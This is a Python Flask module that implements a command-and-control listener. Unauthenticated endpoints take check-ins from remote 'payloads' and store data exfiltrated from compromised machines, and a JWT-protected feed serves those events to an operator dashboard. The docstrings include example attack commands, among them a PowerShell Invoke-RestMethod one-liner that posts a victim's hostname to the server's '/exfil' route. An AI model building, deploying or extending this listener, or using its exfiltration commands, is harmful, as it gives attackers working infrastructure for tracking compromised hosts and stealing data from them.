import os
import logging
from datetime import datetime
from flask import Blueprint, request, jsonify, current_app
from flask_jwt_extended import jwt_required
from models import db, AuditLog

# This module provides a simple "Listener" or "Callback" endpoint 
# to log successful executions or check-ins from remote payloads.

listener_bp = Blueprint('listener', __name__, url_prefix='/api/l')

def _log_callback(action, target, details, ip):
    """Internal helper to log listener hits to the AuditLog."""
    entry = AuditLog(
        user_id=None, 
        action=action, 
        target=target, 
        details=details, 
        ip_address=ip
    )
    db.session.add(entry)
    db.session.commit()

@listener_bp.route('/checkin/<identifier>', methods=['GET', 'POST'])
def checkin(identifier):
    """
    Generic check-in endpoint for payloads.
    Example: curl http://server/api/l/checkin/payload_v1
    """
    details = f"Method: {request.method}"
    if request.is_json:
        details += f" | Data: {request.get_json()}"
    elif request.form:
        details += f" | Form: {request.form.to_dict()}"
    
    _log_callback('payload_checkin', identifier, details, request.remote_addr)
    
    return jsonify({
        "status": "success",
        "timestamp": datetime.utcnow().isoformat(),
        "received": identifier
    }), 200

@listener_bp.route('/exfil/<label>', methods=['POST'])
def exfiltrate(label):
    """
    Endpoint to receive small strings or data blobs (e.g., hostname, whoami).
    Example: powershell -c "Invoke-RestMethod -Uri http://server/api/l/exfil/host -Method Post -Body (hostname)"
    """
    data = request.get_data(as_text=True)

    _log_callback('data_exfil', label, f"Content: {data[:1000]}", request.remote_addr)

    return jsonify({
        "status": "success",
        "timestamp": datetime.utcnow().isoformat(),
        "label": label,
        "bytes_received": len(data),
    }), 200


@listener_bp.route('/events', methods=['GET'])
@jwt_required()
def listener_events():
    """Returns recent listener events (checkins + exfils) for the dashboard UI."""
    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 50, type=int), 200)

    pagination = (
        AuditLog.query
        .filter(AuditLog.action.in_(['payload_checkin', 'data_exfil']))
        .order_by(AuditLog.timestamp.desc())
        .paginate(page=page, per_page=per_page, error_out=False)
    )

    return jsonify({
        "events": [
            {
                "id": e.id,
                "action": e.action,
                "target": e.target,
                "details": e.details,
                "ip_address": e.ip_address,
                "timestamp": e.timestamp.isoformat(),
            }
            for e in pagination.items
        ],
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": page,
    }), 200
